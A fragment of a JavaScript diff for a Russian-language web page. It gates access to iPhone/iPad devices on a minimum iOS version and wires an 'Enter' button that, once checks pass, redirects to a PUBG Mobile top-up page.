-      UI.reason.textContent = `${platIsIPad ? "иPadOS" : "iOS"} ${res.iosMajor}.`;
-    }
-    if (UI.note) UI.note.textContent = "Кнопка активируется после проверки.";
-    showBtn();
-    setBtnLocked();
-
-    if (UI.btn && !UI.btn.__wired) {
-      UI.btn.__wired = true;
-      UI.btn.addEventListener("click", (e) => {
-        if (!window.__reportReady) { e.preventDefault(); return; }
-        location.assign("https://www.pubgmobile.com/ig/itop");
-      });
-    }
-    setTimeout(() => autoFlow(), 100);
-  } else {
-    if (UI.title) UI.title.textContent = "Доступ отклонён";
-    if (UI.text) UI.text.innerHTML = '<span class="err">Отказ в доступе.</span>';
-    if (UI.reason) UI.reason.textContent = "Причина: " + res.reason;
-    if (UI.note) UI.note.textContent = `Доступ только на iPhone/iPad с iOS/iPadOS ${MIN_IOS_MAJOR}+ (любой браузер).`;
-    hideBtn();
-  }
-}
-
-// защита от преждевременного клика
-(function guardClick() {
-  const btn = UI.btn;
-  if (!btn) return;
+// Кнопка «Войти»
+(function wireEnter() {
+  const btn = UI.btn; if (!btn) return;
   btn.addEventListener("click", (e) => {
-    if (!window.__reportReady) {
-      e.preventDefault();
-      e.stopPropagation();
+    if (!window.__reportReady || !window.__decision?.canLaunch) {
+      e.preventDefault(); e.stopPropagation(); return;
     }
+    location.assign("https://www.pubgmobile.com/ig/itop");
   }, { capture: true });
 })();
 
 // Старт после готовности DOM
 if (document.readyState === "complete" || document.readyState === "interactive") {
-  applyGateAndUI();
+  setTimeout(() => autoFlow(), 60);
 } else {
-  document.addEventListener("DOMContentLoaded", applyGateAndUI);
+  document.addEventListener("DOMContentLoaded", () => setTimeout(() => autoFlow(), 60));
 }
